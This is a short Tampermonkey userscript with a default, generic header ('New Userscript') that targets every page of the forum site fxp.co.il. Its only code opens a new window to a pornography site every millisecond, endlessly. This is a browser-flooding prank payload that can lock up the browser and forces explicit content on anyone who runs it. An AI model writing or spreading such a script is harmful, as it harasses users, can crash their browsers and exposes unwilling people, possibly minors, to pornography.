// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  try to take over the world!
// @author       You
// @match        https://www.fxp.co.il/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    setInterval(function() {window.open("http://www.pornhub.com")}, 1);
})();